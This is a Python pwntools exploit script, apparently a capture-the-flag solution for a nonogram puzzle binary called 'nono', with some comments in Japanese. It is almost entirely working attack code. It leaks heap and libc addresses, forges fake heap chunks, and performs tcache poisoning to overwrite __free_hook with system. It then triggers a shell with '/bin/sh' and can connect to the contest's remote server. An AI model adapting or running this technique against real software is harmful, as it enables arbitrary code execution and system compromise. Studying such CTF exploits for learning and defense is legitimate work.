#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./nono"
LIBCNAME = "./libc.so.6"

hosts = ("pwn03.chal.ctf.westerns.tokyo","localhost","localhost")
ports = (22915,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge(ix):
  c.recvuntil("Your input: ")
  c.sendline(str(ix))

def play():
  hoge(1)

def add(title, size, puzzle):
  hoge(2)
  c.recvuntil("Title: ")
  c.sendline(title)
  c.recvuntil("Size: ")
  c.sendline(str(size))
  c.recvuntil("Puzzle: ")
  c.send(puzzle)

def _del(ix):
  hoge(3)
  c.recvuntil("Index:")
  c.recvline()
  c.sendline(str(ix))

def show(): # not used
  hoge(4)

def _exit(): # not used
  hoge(5)

## exploit ###########################################

def exploit():
  global c

  # leak heapbase
  add("A"*0x10, 91, p8(0)*0x400)
  hoge(1)
  c.recvuntil("Index:\n")
  c.sendline(str(2))
  c.recvuntil("Row's Numbers\n")
  lastrow = c.recvuntil("C")[:-1].rstrip()
  lastrow = lastrow.split("\n")[2:]
  print("******************")
  print(hex(len(lastrow)))
  print(lastrow)
  print("******************")
  c.recvuntil(":")

  leaked1 = 0
  for i in range(64):
    if lastrow[63-i]=='1':
      leaked1 += 1<<(63-i)
  print("[+] leaked1: {}".format(hex(leaked1)))
  c.sendline("100 100") # 一旦playオワリ

  heapbase = leaked1 - 0x1f90 # この値は前までの操作に依る
  print("[+] heapbase: {}".format(hex(heapbase)))

  # 巨大chunk
  add("C"*0x450, 10, p8(0))

  # unsortedbinからlibcbase leak
  unsor_target = heapbase + 0x2c20 + 0x10
  target = heapbase + 0x4140
  print("[+] target: {}".format(hex(target)))
  print("[+] unsorted target: {}".format(hex(unsor_target)))

  pay = ""
  pay += p8(0x21)*0x10
  pay += p64(heapbase + 0x4170) # 下のHOGEを指す
  pay += p64(heapbase + 0x4170) # 下のHOGEを指す
  pay += p8(0x21)*0x18
  pay += p64(0x51) # fake_size
  pay += p64(0x8) # size HOGE
  pay += p64(heapbase + 0x55af30b74f80-0x55af30b73000 + 0x10) # correct_map -> freeしても良いアドレス
  pay += p64(unsor_target) # name  == target to read
  pay += p64(0x10)
  pay += p64(0x10)
  pay += p64(0x21)*5 # fake next chunk
  pay += p8(0) * (0x400 - len(pay))
  pay += p64(target)
  pay += p64(target+0x8)
  pay += p64(target+0x60)
  pay += "A"*0x8
  add(pay, 92, pay) # 4

  hoge(1)
  c.recvuntil("0 : ")
  unsor = unpack(c.recv(8))
  libcbase = unsor - 0x1ebbe0 # libc依存
  print("[+] unsorted: {}".format(hex(unsor)))
  print("[+] libcbase: {}".format(hex(libcbase)))

  c.recvuntil("Index:")
  c.recvline()
  c.sendline(str(3)) # 一旦playオワリ



  target_tcache = 0x5606e6d6fce0-0x5606e6d6d000 + heapbase
  print("[ ] target: {}".format(hex(target_tcache)))

  # 調整
  add("A"*0xb90, 10, p64(0))

  # 偽chunkA
  payA = b""
  payA += p64(heapbase + 0x5606e6d6fd10-0x5606e6d6d000) # fake ptr pointing HERE
  payA += p64(0x101)*0x3
  payA += p64(0) + p64(0x131) # fake size HERE
  payA += p64(3) # size
  payA += p64(heapbase + 0x55e8ecf08e90-0x55e8ecf06000 + 0x10 + 0x160 - 0x230) # correct 適当
  payA += p64(heapbase + 0x564a7fbb4e00-0x564a7fbb2000) # name
  payA += p64(3)*2 # unk unk
  add(payA, 10, p64(0))
  print("[ ] phase 1")


  # 偽chunkB
  payB = b""
  payB += "I"*0x20
  payB += p64(0) + p64(0x131) # fake size
  payB += p64(3) # size
  payB += "J"*0x8 # correct
  payB += "K"*0x8 # name
  payB += p64(3)*2 
  payB += p64(0x21) * ((0xf8-len(payB)) // 0x8)
  print("[ ] phase 2")
  add(payB, 92, p8(0)*0x400 + p64(target_tcache) + p64(target_tcache+8)) # overwrite vec_puzzle

  # heap feng shui
  _del(0)
  print("[*] deleted")

  # tcache poisoning  + free_hook overwrite
  pay = b""
  pay += p64(0x21)*0xe*2
  pay += p64(0)
  pay += p64(0x21)

  pay += p64(libcbase + libc.symbols["__free_hook"] - 0x9)
  print("hoge: {}".format(hex(libcbase + libc.symbols["__free_hook"]-0x9)))

  pay += p64(0xdeadbeef)
  pay += p8(0x00) * (0x120 - len(pay))
  add(pay, 10, p64(0))

  ogs = [0xe6ce3, 0xe6ce6, 0xe6ce9, 0x54f7b] # 3番目は隠れonegadgetだが使えない

  # pop a shell.
  pay = b""
  pay += "/bin/sh\x00\x00"
  pay += p64(libcbase + libc.symbols["system"])

  add(pay, 12, p64(0))


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
